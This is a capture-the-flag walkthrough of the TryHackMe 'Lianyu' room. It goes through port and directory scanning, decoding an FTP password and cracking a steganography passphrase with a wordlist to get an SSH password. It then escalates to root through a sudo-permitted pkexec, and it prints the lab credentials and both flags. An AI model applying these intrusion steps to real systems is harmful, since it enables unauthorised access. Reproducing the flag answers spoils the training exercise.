# Lianyu

## Task 1 -- Find the Flags

### 1 - Deploy the VM and Start the Enumeration.
```bash
export IP=10.10.96.66
```

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ nmap -sC -sV -Pn -n -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 01:41 MDT
Nmap scan report for 10.10.96.66
Host is up (0.14s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 3.0.2
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey:
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Purgatory
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36277/tcp6  status
|   100024  1          45022/udp   status
|   100024  1          47566/tcp   status
|_  100024  1          60786/udp6  status
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.71 seconds
```

### 2 - What is the Web Directory you found?
```bash
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ gobuster dir -u http://$IP/island -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.96.66/island
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/24 01:50:54 Starting gobuster
===============================================================
/2100 (Status: 301)
```

### 3 - what is the file name you found?
```bash
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ gobuster dir -u http://$IP/island/2100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x ticket
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.96.66/island/2100
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     ticket
[+] Timeout:        10s
===============================================================
2020/05/24 02:10:16 Starting gobuster
===============================================================
/green_arrow.ticket (Status: 200)
```

### 4 - what is the FTP Password?

Gobuster also found the `/island` directory, which in the HTML source we found the FTP username, `vigilante`:

![island](https://user-images.githubusercontent.com/32188816/82750322-9fb9bc80-9d6c-11ea-9709-52a2498d580b.png)


As for the FTP password, we have the following text that we found at the `/island/2100/green_arrow.ticket` page:

![token](https://user-images.githubusercontent.com/32188816/82750320-9e888f80-9d6c-11ea-9277-1687d2343d66.png)

This looks like base 58, so we can use CyberChef to decode to the FTP password:

![chef](https://user-images.githubusercontent.com/32188816/82750323-a21c1680-9d6c-11ea-983a-7a746452e123.png)


### 5 - what is the file name with SSH password?
After logging into FTP, we see a couple of images that we downloaded:

```bash
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 .
drwxr-xr-x    4 0        0            4096 May 01 05:38 ..
-rw-------    1 1001     1001           44 May 01 07:13 .bash_history
-rw-r--r--    1 1001     1001          220 May 01 05:38 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01 05:38 .bashrc
-rw-r--r--    1 0        0            2483 May 01 07:07 .other_user
-rw-r--r--    1 1001     1001          675 May 01 05:38 .profile
-rw-r--r--    1 0        0          511720 May 01 03:26 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05 11:10 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01 03:25 aa.jpg
```

We also notice that there is another user on the box, `slade`:

```bash
ftp> pwd
257 "/home/vigilante"
ftp> cd ..
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwx------    2 1000     1000         4096 May 01 06:55 slade
drwxr-xr-x    2 1001     1001         4096 May 05 11:10 vigilante
```

Running strings on these files gave nothing, nor did stegsolve. However, since we do have one `.jpg` file, using stegcracker we guessed the password to use steghide on `aa.jpg`.

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ python3 -m stegcracker aa.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.0.8 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2020 - Luke Paris (Paradoxis)

Counting lines in wordlist..
Attacking file 'aa.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: password
Tried 4 passwords
Your file has been written to: aa.jpg.out
password
```

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ steghide extract -sf aa.jpg
Enter passphrase:
wrote extracted data to "ss.zip".
```

Unzipping the hidden archive gives us two files:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ unzip ss.zip
Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado  
```

The password is stored in the `shado` file:
```bash
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ cat shado
M3tahuman
jeffrowell@kali:~/Documents/TryHackMe/Lianyu$ cat passwd.txt
This is your visa to Land on Lian_Yu # Just for Fun ***

a small Note about it

Having spent years on the island, Oliver learned how to be resourceful and
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.
```


### 6 - user.txt
Logging in as slade using the password from the hidden archive:

```bash
slade@LianYu:~$ ls
user.txt
slade@LianYu:~$ cat user.txt
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak
```

### 7 - root.txt
Slade is able to run one command as root, but I have no idea what it does:

```bash
slade@LianYu:/tmp$ sudo -l
[sudo] password for slade:
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
slade@LianYu:/tmp$
```

Trying to run the binary to see what is will do gives some useful help text. Seemingly this binary will run a command using the user that we provide it. So lets give it user root and tell it to cat the `/root/root.txt` file:
```bash
slade@LianYu:/tmp$ sudo pkexec --user root
pkexec --version |
       --help |
       --disable-internal-agent |
       [--user username] PROGRAM [ARGUMENTS...]

See the pkexec manual page for more details.
slade@LianYu:/tmp$ sudo pkexec --user root cat /root/root.txt
                          Mission accomplished

You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE.

THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825
```
